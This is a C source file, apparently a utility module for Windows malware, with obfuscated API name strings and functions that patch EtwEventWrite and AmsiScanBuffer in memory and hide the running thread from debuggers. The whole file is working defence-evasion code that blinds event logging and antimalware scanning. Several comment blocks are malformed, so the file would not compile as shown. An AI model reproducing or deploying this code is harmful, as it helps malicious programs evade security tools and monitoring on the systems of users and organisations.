/**
 * 
 * 
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

/* "EtwEventWrite" */
static unsigned char enc_etweventwrite[] = {
    0x3f, 0x0e, 0x0d, 0x3f, 0x0c, 0x1f, 0x14, 0x0e,
    0x2d, 0x08, 0x13, 0x0e, 0x1f
};
/* "AmsiScanBuffer" */
static unsigned char enc_amsiscanbuffer[] = {
    0x3b, 0x17, 0x09, 0x13, 0x29, 0x19, 0x1b, 0x14,
    0x38, 0x0f, 0x1c, 0x1c, 0x1f, 0x08
};
/* "AmsiInitialize" */
static unsigned char enc_amsiinit[] = {
    0x3b, 0x17, 0x09, 0x13, 0x33, 0x14, 0x13, 0x0e,
    0x13, 0x1b, 0x16, 0x13, 0x00, 0x1f
};
/* "amsi.dll" */
static unsigned char enc_amsidll[] = {0x1b, 0x17, 0x09, 0x13, 0x54, 0x1e, 0x16, 0x16};
/* "NtSetInformationThread" */
static unsigned char enc_ntsetinfothread[] = {
    0x34, 0x0e, 0x29, 0x1f, 0x0e, 0x33, 0x14, 0x1c,
    0x15, 0x08, 0x17, 0x1b, 0x0e, 0x13, 0x15, 0x14,
    0x2e, 0x12, 0x08, 0x1f, 0x1b, 0x1e
};

char* util_etweventwrite(void) { return get_str(enc_etweventwrite, sizeof(enc_etweventwrite)); }
char* util_amsiscanbuffer(void) { return get_str(enc_amsiscanbuffer, sizeof(enc_amsiscanbuffer)); }
char* util_amsiinit(void) { return get_str(enc_amsiinit, sizeof(enc_amsiinit)); }
char* util_amsidll(void) { return get_str(enc_amsidll, sizeof(enc_amsidll)); }
char* util_ntsetinfothread(void) { return get_str(enc_ntsetinfothread, sizeof(enc_ntsetinfothread)); }

 */
void util_disable_etw(void) {
    char *ntdll_name = util_ntdll();
    HMODULE hNtdll = GetModuleHandleA(ntdll_name);
    if (!hNtdll) hNtdll = LoadLibraryA(ntdll_name);
    if (!hNtdll) return;

    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, util_etweventwrite());
    if (!pEtwEventWrite) return;

    /* Patch: ret (0xC3) — function returns immediately, no events logged */
    DWORD oldProtect = 0;
    if (!VirtualProtect(pEtwEventWrite, 1, PAGE_READWRITE, &oldProtect)) return;
    
    *(unsigned char*)pEtwEventWrite = 0xC3; /* ret */
    
    VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
}

 */
void util_disable_amsi(void) {
    char *amsi_name = util_amsidll();
    HMODULE hAmsi = LoadLibraryA(amsi_name);
    if (!hAmsi) return;

    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, util_amsiscanbuffer());
    if (!pAmsiScanBuffer) return;

    /* Patch: xor eax, eax; ret (0x31 0xC0 0xC3)
     * Returns 0 (S_OK = clean) regardless of what was scanned */
    DWORD oldProtect = 0;
    if (!VirtualProtect(pAmsiScanBuffer, 3, PAGE_READWRITE, &oldProtect)) return;
    
    unsigned char patch[] = {0x31, 0xC0, 0xC3}; /* xor eax, eax; ret */
    memcpy(pAmsiScanBuffer, patch, 3);
    
    VirtualProtect(pAmsiScanBuffer, 3, oldProtect, &oldProtect);
}

 * Hides current thread from ETW/debugger using NtSetInformationThread.
 */
void util_hide_thread(void) {
    char *ntdll_name = util_ntdll();
    HMODULE hNtdll = GetModuleHandleA(ntdll_name);
    if (!hNtdll) hNtdll = LoadLibraryA(ntdll_name);
    if (!hNtdll) return;

    typedef NTSTATUS (WINAPI *NtSetInfoThread_t)(HANDLE, ULONG, PVOID, ULONG);
    NtSetInfoThread_t pNtSetInfoThread = (NtSetInfoThread_t)GetProcAddress(hNtdll, util_ntsetinfothread());
    if (!pNtSetInfoThread) return;

    ULONG hide = 1;
    pNtSetInfoThread(GetCurrentThread(), 0x11, &hide, sizeof(hide)); /* ThreadHideFromDebugger */
}
